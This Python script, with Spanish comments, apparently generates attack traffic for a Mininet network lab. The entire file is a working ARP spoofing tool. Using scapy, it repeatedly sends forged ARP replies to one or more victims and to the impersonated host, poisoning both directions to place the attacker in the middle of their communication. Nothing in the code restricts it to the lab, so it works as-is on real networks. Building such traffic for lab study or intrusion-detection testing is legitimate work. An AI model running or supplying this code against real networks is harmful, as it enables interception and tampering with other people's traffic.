#!/usr/bin/env python3
"""
mininet_lab/arp_spoof.py
------------------------
Genera un ataque de ARP spoofing en el laboratorio: envía respuestas ARP
falsificadas de forma continua para envenenar la caché de una o varias
víctimas, haciéndoles creer que 'ip_a_suplantar' está en la MAC del
atacante.
 
    python3 arp_spoof.py <ip_a_suplantar> <mac_atacante> <victima1> [victima2 ...]
 
Admite varias víctimas porque el ARP spoofing real rara vez ataca a una
sola. Lo lanza el generador de tráfico; se detiene con Ctrl+C o
SIGTERM.
"""
import sys
import time
from scapy.all import ARP, send


def main():
    if len(sys.argv) < 4:
        print("Uso: arp_spoof.py <ip_a_suplantar> <mac_atacante> "
              "<victima1> [victima2 ...]")
        sys.exit(1)

    spoofed_ip = sys.argv[1]
    attacker_mac = sys.argv[2]
    victims = sys.argv[3:]

    def send_fake_arp(target_ip, impersonated_ip):
        # op=2 es una respuesta ARP ("is-at") que nadie ha solicitado
        # (ARP gratuito): le dice a target_ip que impersonated_ip está en
        # la MAC del atacante. Es la firma del ataque.
        pkt = ARP(op=2, pdst=target_ip, hwsrc=attacker_mac, psrc=impersonated_ip)
        send(pkt, verbose=False)

    try:
        while True:
            # Se envenena en ambos sentidos para situar al atacante en
            # medio de la comunicación: la víctima cree que la IP
            # suplantada está en su MAC, y el host suplantado cree lo
            # mismo de la víctima.
            for victim_ip in victims:
                send_fake_arp(victim_ip, spoofed_ip)
                send_fake_arp(spoofed_ip, victim_ip)
            time.sleep(1)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
